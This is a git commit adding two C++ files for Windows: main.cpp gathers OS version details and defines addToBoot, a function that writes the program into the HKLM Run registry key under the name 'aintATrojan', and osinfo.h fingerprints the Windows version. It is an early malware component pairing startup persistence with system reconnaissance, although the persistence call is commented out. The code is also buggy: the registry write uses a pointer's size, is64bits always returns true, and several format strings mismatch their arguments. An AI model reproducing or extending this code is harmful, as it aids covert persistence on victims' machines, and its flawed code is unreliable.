9d34364128e44d3f5753d2a4b8bb0d5fcf7571dc
PRDeving <pablo.deving@gmail.com>
2017-01-31 18:16:43 +0100

    basic system info ALSO add to startup

---
+++ main.cpp
@@ -0,0 +1,35 @@
+#include <windows.h>
+#include <stdio.h>
+#include "osinfo.h"
+
+#define HKEY_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+
+void addToBoot(TCHAR *szPath) {
+  char regName[30] = "aintATrojan";
+  HKEY newValue;
+  RegOpenKey(HKEY_LOCAL_MACHINE, HKEY_PATH, &newValue);
+  RegSetValueEx(newValue, regName, 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
+  RegCloseKey(newValue);
+}
+
+int main() {
+  OSVERSIONINFOEX info = getOSInfo();
+  TCHAR ID[64];
+  reconOS(ID, &info);
+
+  TCHAR exePath[MAX_PATH];
+  GetModuleFileName(NULL, exePath, MAX_PATH);
+  // addToBoot(exePath);
+
+  printf("Running in: %s\n", exePath);
+  printf(" Bits: %d\n Major: %d\n Minor: %d\n Build: %d\n Platform: %d\n UID: %s\n ID: %s\n",
+      is64bits() ? 64 : 32,
+      info.dwMajorVersion,
+      info.dwMinorVersion,
+      info.dwBuildNumber,
+      info.dwPlatformId,
+      "",
+      ID);
+
+  return 0;
+}
---
+++ osinfo.h
@@ -0,0 +1,88 @@
+#ifndef H_OSINFO
+#define H_OSINFO
+#include <windows.h>
+
+// FIX this
+BOOL is64bits() {
+  return true;
+}
+
+void reconOS(TCHAR *ID, OSVERSIONINFOEX * info) {
+  TCHAR tag[128];
+
+  if (info -> dwMajorVersion == 10) {
+    if (info -> wProductType == VER_NT_WORKSTATION){
+      sprintf(tag, "10 (%d.%d) %s", info -> dwMajorVersion, info -> dwMinorVersion, is64bits() ? "64bits" : "32bits");
+    } else {
+      sprintf(tag, "Server 2016 (%d.%d)", info -> dwMajorVersion, info -> dwMinorVersion);
+    }
+  } else if (info -> dwMajorVersion == 6) {
+    switch (info -> dwMinorVersion) {
+      case 3:
+      case 2:
+        if (info -> wProductType == VER_NT_WORKSTATION){
+          sprintf(tag, "8%d (%d.%d) %s",
+              info -> dwMinorVersion == 3 ? ".1" : "",
+              info -> dwMajorVersion,
+              info -> dwMinorVersion,
+              is64bits() ? "64bits" : "32bits");
+        } else {
+          sprintf(tag, "Server 2012%s (%d.%d)",
+              info -> dwMinorVersion == 3 ? " R2" : "",
+              info -> dwMajorVersion,
+              info -> dwMinorVersion);
+        }
+        break;
+      case 1:
+      case 0:
+        if (info -> wProductType == VER_NT_WORKSTATION){
+          sprintf(tag, "%d (%d.%d) %s",
+              info -> dwMinorVersion == 1 ? "7" : "Vista",
+              info -> dwMajorVersion,
+              info -> dwMinorVersion,
+              is64bits() ? "64bits" : "32bits");
+        } else {
+          sprintf(tag, "Server 2008%s (%d.%d)",
+              info -> dwMinorVersion == 1 ? " R2" : "",
+              info -> dwMajorVersion,
+              info -> dwMinorVersion);
+        }
+        break;
+    }
+  } else if (info -> dwMajorVersion == 5) {
+    switch (info -> dwMinorVersion) {
+      case 2:
+        if (info -> wProductType == VER_NT_WORKSTATION){
+          sprintf(tag, "XP Professional x64 (%d.%d) %s",
+              info -> dwMinorVersion == 3 ? ".1" : "",
+              info -> dwMajorVersion,
+              info -> dwMinorVersion,
+              is64bits() ? "64bits" : "32bits");
+        } else {
+          sprintf(tag, "Server 2003 (%d.%d)",
+              info -> dwMajorVersion,
+              info -> dwMinorVersion);
+        }
+        break;
+      case 1:
+      case 0:
+        sprintf(tag, "%d (%d.%d) %s",
+            info -> dwMinorVersion == 1 ? "XP" : "2000",
+            info -> dwMajorVersion,
+            info -> dwMinorVersion,
+            is64bits() ? "64bits" : "32bits");
+        break;
+    }
+  }
+  sprintf(ID, "Windows %s\0", tag);
+}
+
+OSVERSIONINFOEX getOSInfo() {
+  OSVERSIONINFOEX osvi;
+  ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
+  osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
+  GetVersionEx((LPOSVERSIONINFO)&osvi);
+
+  return osvi;
+}
+#endif
